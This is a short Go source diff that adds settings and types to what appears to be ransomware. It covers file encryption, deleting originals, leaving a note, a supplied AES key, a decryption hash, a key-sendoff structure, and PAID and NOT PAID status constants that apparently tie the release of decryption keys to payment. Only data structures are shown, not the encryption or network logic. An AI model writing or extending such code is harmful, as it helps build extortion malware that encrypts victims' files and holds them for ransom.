@@ -10,6 +10,9 @@ type OperatingMode int
 
 type ProgramSettings struct {
 	EncryptionMode   bool
+	SuppliedAESKey   string //testing purposes
+	PaidStatus       bool
+	DecryptionHash   string
 	Delete           bool
 	sep              string
 	Key              string
@@ -19,6 +22,7 @@ type ProgramSettings struct {
 	EncryptedFileExt string
 	Recursion        bool
 	LeaveNote        bool
+	RawKey           bool
 }
 
 func (ps *ProgramSettings) GetDir() (string, error) {
@@ -51,6 +55,26 @@ const (
 	RequiredOr   RequiredType = 1
 	Optional     RequiredType = 2
 	RequiredWith RequiredType = 3
+)
+
+type GetKeyResponse struct {
+	Status  string `json:"status"`
+	Key     string `json:"key"`
+	Message string `json:"message"`
+}
+
+type KeySendoffStruct struct {
+	Key  string `json:"key"`
+	Hash string `json:"hash"`
+	Paid bool   `json:"paid"`
+}
+
+type PaidStatus string
+
+const (
+	UNPAID PaidStatus = "NOT PAID"
+	PAID   PaidStatus = "PAID"
+	ERROR  PaidStatus = "ERROR"
 )
 
 type Queue struct {
